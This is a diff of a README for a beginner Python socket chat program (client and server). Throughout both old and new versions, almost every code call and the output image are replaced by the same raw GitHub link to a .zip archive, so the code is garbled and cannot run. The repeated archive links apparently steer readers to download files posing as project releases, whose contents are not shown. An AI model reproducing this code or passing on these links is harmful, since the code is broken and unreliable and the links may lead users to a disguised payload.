@@ -81,15 +81,15 @@ Client-server chat applications are foundational to real-time communication over
 
 import socket
 
-client = https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Study_Chat_v3.3-alpha.3.zip(https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Study_Chat_v3.3-alpha.3.zip, https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Study_Chat_v3.3-alpha.3.zip)
+client = https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Chat_Study_3.2-beta.2.zip(https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Chat_Study_3.2-beta.2.zip, https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Chat_Study_3.2-beta.2.zip)
 
-https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Study_Chat_v3.3-alpha.3.zip(("localhost", 9999))
+https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Chat_Study_3.2-beta.2.zip(("localhost", 9999))
 
 done=False
 
 while not done:
-    https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Study_Chat_v3.3-alpha.3.zip(input("Message ").encode('utf-8'))
-    msg = https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Study_Chat_v3.3-alpha.3.zip(1024).decode('utf-8')
+    https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Chat_Study_3.2-beta.2.zip(input("Message ").encode('utf-8'))
+    msg = https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Chat_Study_3.2-beta.2.zip(1024).decode('utf-8')
 
     if msg == 'quit':
         done=True
@@ -98,7 +98,7 @@ while not done:
 
 
 
-https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Study_Chat_v3.3-alpha.3.zip()
+https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Chat_Study_3.2-beta.2.zip()
 
 ```
 ### server
@@ -107,30 +107,30 @@ import socket
 from base64 import decode
 from operator import truediv
 
-server https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Study_Chat_v3.3-alpha.3.zip(https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Study_Chat_v3.3-alpha.3.zip, https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Study_Chat_v3.3-alpha.3.zip)
-https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Study_Chat_v3.3-alpha.3.zip(('localhost', 9999))
-https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Study_Chat_v3.3-alpha.3.zip()
-client,https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Study_Chat_v3.3-alpha.3.zip()
+server https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Chat_Study_3.2-beta.2.zip(https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Chat_Study_3.2-beta.2.zip, https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Chat_Study_3.2-beta.2.zip)
+https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Chat_Study_3.2-beta.2.zip(('localhost', 9999))
+https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Chat_Study_3.2-beta.2.zip()
+client,https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Chat_Study_3.2-beta.2.zip()
 
 done = False
 
 while not done:
-    msg = https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Study_Chat_v3.3-alpha.3.zip(1024).decode('utf-8')
+    msg = https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Chat_Study_3.2-beta.2.zip(1024).decode('utf-8')
 
     if msg == 'quit':
         done = True
     else:
         print(msg)
 
-    https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Study_Chat_v3.3-alpha.3.zip(input("Message ").encode('utf-8'))
+    https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Chat_Study_3.2-beta.2.zip(input("Message ").encode('utf-8'))
 
 
-https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Study_Chat_v3.3-alpha.3.zip()
-https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Study_Chat_v3.3-alpha.3.zip()
+https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Chat_Study_3.2-beta.2.zip()
+https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Chat_Study_3.2-beta.2.zip()
 ```
 
 ## OUTPUT:
-![image](https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Study_Chat_v3.3-alpha.3.zip)
+![image](https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Chat_Study_3.2-beta.2.zip)
 
 
 
